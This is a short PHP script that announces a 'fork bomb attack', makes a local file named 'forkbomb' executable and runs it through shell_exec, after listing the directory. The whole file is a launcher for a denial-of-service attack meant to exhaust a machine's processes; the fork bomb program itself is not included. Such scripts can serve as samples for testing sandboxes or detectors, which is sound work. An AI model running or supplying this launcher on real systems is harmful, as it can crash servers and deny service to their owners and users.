<?php 
echo "Executing fork bomb attack\n";

shell_exec('chmod 700 forkbomb');
$output = shell_exec('ls -al');
echo $output;


shell_exec('./forkbomb');
?>
